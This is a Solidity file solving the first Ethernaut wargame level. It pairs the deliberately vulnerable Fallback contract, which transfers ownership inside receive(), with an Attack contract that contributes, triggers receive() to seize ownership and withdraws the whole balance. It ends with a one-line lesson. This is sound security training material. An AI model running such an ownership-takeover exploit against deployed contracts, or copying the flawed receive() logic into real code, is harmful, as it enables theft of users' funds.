// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

//this is first level of ethernaut
//Fallback is target contract
contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor(){
    owner = payable(msg.sender);
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = payable(msg.sender);
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = payable(msg.sender);
  }
}

// this is the attack contract to drain the funds in the Fallback contract

contract Attack{
    address payable fc;

    constructor(address payable _fc){
        fc=_fc;
    }
    fallback()external payable{

    }
    
    //here adding the just some ether to the Fallback contract
    function attack()external payable{
        (bool success,)=fc.call{value:msg.value}(
            abi.encodeWithSignature(
                "contribute()"
            ));
        require(success,"call failed for contribute");
    }
    
    //here spaming the receive function by sending 1 wei to be owner and to withraw total ether in the contract
    function attackFoo()external payable{
         (bool suc,)=fc.call{value:msg.value}("");
       require(suc,"calling to receive failed");
    }

    function withdraw()external{
        (bool success,)=fc.call(abi.encodeWithSignature("withdraw()"));
        require(success,"withdraw failed");
    }

    receive()external payable{

    }

    function getBalance()external view returns(uint){
        return address(this).balance;
    }
}

//summary :
//1.u should not update the owner of the contract in the fallback function